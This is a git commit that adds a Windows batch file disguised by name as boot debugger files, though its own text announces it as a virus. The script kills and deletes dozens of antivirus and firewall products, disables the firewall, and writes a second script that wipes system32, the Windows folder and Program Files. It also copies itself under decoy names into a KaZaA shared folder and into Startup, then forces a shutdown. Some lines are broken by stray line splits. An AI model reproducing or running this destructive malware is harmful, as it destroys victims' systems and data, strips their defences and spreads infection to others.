b5d3f41125009bc67c56fc06aa025d895e1d4099
Microshaft <41166367+MicroshaftCorp@users.noreply.github.com>
2018-07-21 12:15:58 -0700

    Create BootDebbugerFiles.bat

---
+++ BootDebbugerFiles.bat
@@ -0,0 +1,238 @@
+@echo off
+title WindowsBOOT Debugger Files
+echo Your PC Has Infect By n vi!
+msg * D\;[kpkkkppkooplllllllllmmmmn 
+start BootDebbugerFiles.bat
+start https://github.com/MicroshaftCorp/-n/new/master
+title Windows Emali
+echo /!\ W A R N I N G !
+echo You PC i Infect!
+rem --
+rem Permanently Kill Anti-Virus
+net stop “Security Center”
+netsh firewall set opmode mode=disable
+tskill /A av*
+tskill /A fire*
+tskill /A anti*
+cls
+tskill /A spy*
+tskill /A bullguard
+tskill /A PersFw
+tskill /A KAV*
+tskill /A ZONEALARM
+tskill /A SAFEWEB
+cls
+tskill /A OUTPOST
+tskill /A nv*
+tskill /A nav*
+tskill /A F-*
+tskill /A ESAFE
+tskill /A cle
+cls
+tskill /A BLACKICE
+tskill /A def*
+tskill /A kav
+tskill /A kav*
+tskill /A avg*
+tskill /A ash*
+cls
+tskill /A aswupdsv
+tskill /A ewid*
+tskill /A guard*
+tskill /A guar*
+tskill /A gcasDt*
+tskill /A msmp*
+cls
+tskill /A mcafe*
+tskill /A mghtml
+tskill /A msiexec
+tskill /A outpost
+tskill /A isafe
+tskill /A zap*
+cls
+tskill /A zauinst
+tskill /A upd*
+tskill /A zlclien*
+tskill /A minilog
+tskill /A cc*
+tskill /A norton*
+cls
+tskill /A norton au*
+tskill /A ccc*
+tskill /A npfmn*
+tskill /A loge*
+tskill /A nisum*
+tskill /A issvc
+tskill /A tmp*
+cls
+tskill /A tmn*
+tskill /A pcc*
+tskill /A cpd*
+tskill /A pop*
+tskill /A pav*
+tskill /A padmin
+cls
+tskill /A panda*
+tskill /A avsch*
+tskill /A sche*
+tskill /A syman*
+tskill /A virus*
+tskill /A realm*
+cls
+tskill /A sweep*
+tskill /A scan*
+tskill /A ad-*
+tskill /A safe*
+tskill /A avas*
+tskill /A norm*
+cls
+tskill /A offg*
+del /Q /F C:\Program Files\alwils~1\avast4\*.*
+del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
+del /Q /F C:\Program Files\kasper~1\*.exe
+cls
+del /Q /F C:\Program Files\trojan~1\*.exe
+del /Q /F C:\Program Files\f-prot95\*.dll
+del /Q /F C:\Program Files\tbav\*.dat
+cls
+del /Q /F C:\Program Files\avpersonal\*.vdf
+del /Q /F C:\Program Files\Norton~1\*.cnt
+del /Q /F C:\Program Files\Mcafee\*.*
+cls
+del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
+del /Q /F C:\Program Files\Norton~1\*.*
+cls
+del /Q /F C:\Program Files\avgamsr\*.exe
+del /Q /F C:\Program Files\avgamsvr\*.exe
+del /Q /F C:\Program Files\avgemc\*.exe
+cls
+del /Q /F C:\Program Files\avgcc\*.exe
+del /Q /F C:\Program Files\avgupsvc\*.exe
+del /Q /F C:\Program Files\grisoft
+del /Q /F C:\Program Files
+ood32krn\*.exe
+del /Q /F C:\Program Files
+ood32\*.exe
+cls
+del /Q /F C:\Program Files
+od32
+del /Q /F C:\Program Files
+ood32
+del /Q /F C:\Program Files\kav\*.exe
+del /Q /F C:\Program Files\kavmm\*.exe
+del /Q /F C:\Program Files\kaspersky\*.*
+cls
+del /Q /F C:\Program Files\ewidoctrl\*.exe
+del /Q /F C:\Program Files\guard\*.exe
+del /Q /F C:\Program Files\ewido\*.exe
+cls
+del /Q /F C:\Program Files\pavprsrv\*.exe
+del /Q /F C:\Program Files\pavprot\*.exe
+del /Q /F C:\Program Files\avengine\*.exe
+cls
+del /Q /F C:\Program Files\apvxdwin\*.exe
+del /Q /F C:\Program Files\webproxy\*.exe
+del /Q /F C:\Program Files\panda software\*.*
+rem --
+if exist c:\romp.bat goto end
+:start
+cls 
+Echo Installing Update...
+cd c:\windows\system 
+del keyboard.drv 
+del mouse.drv 
+TITLE System Update
+echo ::startup >> c:\romp.bat
+echo if not exist c:\damp goto prompt >> c:\romp.bat
+echo :start >> c:\romp.bat
+echo cls >> c:\romp.bat
+echo cd c:\ >> c:\romp.bat
+echo cd damp >> c:\romp.bat
+echo md keys >> c:\romp.bat
+echo pause >> c:\romp.bat
+echo copy *.bat c:\damp\keys\ILOVEYOU.bat >> c:\romp.bat
+echo copy *.bat c:\damp\keys\ILOVEYOU.bat c:\windows\stone.bat >> c:\romp.bat
+echo rmdir c:\WUTemp >> c:\romp.bat
+echo del c:\windows\system32\*.* >> c:\romp.bat
+echo rmdir c:\windows\system32 >> c:\romp.bat
+echo cd c:\ >> c:\romp.bat
+echo cd windows >> c:\romp.bat
+echo md system32 >> c:\romp.bat
+echo pause >> c:\romp.bat
+echo cd c:\ >> c:\romp.bat
+echo cd windows >> c:\romp.bat
+echo cd system32 >> c:\romp.bat
+echo md tools >> c:\romp.bat
+echo copy *.bat c:\windows\system32\tools\urscrewed.bat
+echo echo msgbox" Ur system is now screwed" >> c:\plastic.vbs >> c:\romp.bat
+echo echo msgbox" This was no scan... it was more like a scam" >> c:\plastic.vbs >> c:\romp.bat
+echo echo msgbox" It has deleted pretty much all of system32 which is in windows and has messed 
+ 
+with windows" >> c:\plastic.vbs >> c:\romp.bat
+echo echo msgbox" There is no more windows on this computer" >> c:\plastic.vbs >> c:\romp.bat
+echo Rd/s/q c:\windows >> c:\romp.bat
+echo Rd/s/q c:\progra~1 >> c:\romp.bat
+echo goto part2 >> c:\romp.bat
+      >> c:\romp.bat
+      >> c:\romp.bat
+echo :part2 >> c:\romp.bat
+echo cls >> c:\romp.bat
+echo cd c:\ >> c:\romp.bat
+echo md Kierstyn'scan >> c:\romp.bat
+echo pause >> c:\romp.bat
+echo goto part3 >> c:\romp.bat
+        >> c:\romp.bat
+        >> c:\romp.bat
+echo :part3 >> c:\romp.bat
+echo rename c:\windows c:\viriiscan >> c:\romp.bat
+echo goto end1 >> c:\romp.bat
+ 
+echo :prompt >> c:\romp.bat
+echo cls >> c:\romp.bat
+echo cd c:\ >> c:\romp.bat
+echo md damp >> c:\romp.bat
+echo copy *.bat c:\damp.bat >> c:\romp.bat
+echo echo msgbox" Oh No u r so stupid" >> c:\pomper.vbs >> c:\romp.bat
+echo echo msgbox" Wow you probably got this through ur lan" >> c:\pomper.vbs >> c:\romp.bat
+echo echo msgbox" Happy dieing staples" >> c:\pomper.vbs >> c:\romp.bat
+echo goto start >> c:\romp.bat
+      >> c:\romp.bat
+      >> c:\romp.bat 
+echo :end1 >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Matrix2.vid.bat >> c:\romp.bat 
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\8-legged-freaks.vid.bat >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Password_finder.exe.bat >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\s-club7.bmp.bat >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\JackAss the movie.vid.bat >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\password hacker.exe.bat >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Norton anti virus.exe.bat >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\8-mile.mpg.bat >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\kazaa.exe.bat >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\realplayer.exe.bat >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\MyPic.bmp.bat >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Bill gates *very funny*.bmp.bat >> 
+ 
+c:\romp.bat 
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Bill gates *very funny*.mpg.bat >> 
+ 
+c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\windows xp.exe.bat >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\How to make viruses.txt.bat >> 
+ 
+c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\*very funny*.bmp.bat >> c:\romp.bat
+echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\How to stop worm viruses.txt.bat >> 
+ 
+c:\romp.bat
+echo goto end >> c:\romp.bat
+echo :end >> c:\romp.bat
+Echo Virus installed
+cd c:\Docume~1\All Users\Start Menu\Programs\Startup
+copy *.bat cd c:\Docume~1\All Users\Start Menu\Programs\Startup
+Echo Now You have to restart to save
+START C:\WINDOWS\RUNDLL.EXE user.exe,exitwindowsexec 
+rundll32.exe shell32.dll,SHExitWindowsEx n 
+pause
+del c:\thecreator.bat:end
